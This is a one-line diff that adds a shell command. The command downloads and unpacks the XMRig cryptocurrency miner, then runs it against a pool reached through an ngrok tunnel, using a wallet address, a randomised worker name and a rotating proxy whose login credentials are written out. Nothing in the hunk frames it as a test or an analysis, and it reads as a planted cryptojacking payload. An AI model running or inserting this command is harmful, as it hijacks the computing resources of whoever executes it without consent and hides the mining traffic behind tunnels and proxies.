@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz && tar -zxf xmrig-6.18.0-linux-static-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -o 8.tcp.ngrok.io:16351 -a rx/0 -k -u RVN:RRzL8NpRvYccXCaBXbm4BVyVSja3tGmMqs.$(echo $(shuf -i 1-9999 -n 1)-DEV)+10000 -p x --proxy tqhbxpjv-GB-NL-rotate:2avb77qohcwl@p.webshare.io:80
